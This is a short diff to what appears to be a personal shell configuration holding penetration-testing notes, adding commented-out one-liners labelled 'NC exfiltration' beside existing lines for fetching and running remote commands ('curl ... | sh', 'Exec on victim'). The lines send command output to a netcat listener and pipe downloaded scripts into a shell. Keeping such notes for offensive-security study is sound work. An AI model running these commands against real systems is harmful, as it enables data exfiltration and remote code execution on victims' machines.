@@ -100,6 +100,10 @@ alias sharpshooter='echo "cd ~/Desktop/SharedFolder/01-Certifications/01-Offensi
 # curl -s -A "$(curl -s http://127.0.0.1/command | sh)" http://127.0.0.1 > /dev/null
 # curl -s -A "`curl -s http://127.0.0.1/command | sh`" http://127.0.0.1 > /dev/null
 
+# NC exfiltration
+# curl -F ":data=`ls -la`" http://127.0.0.1:8080
+# nc -lvp 8080
+
 # Exec on victim
 # curl http://127.0.0.1/rev | sh
 
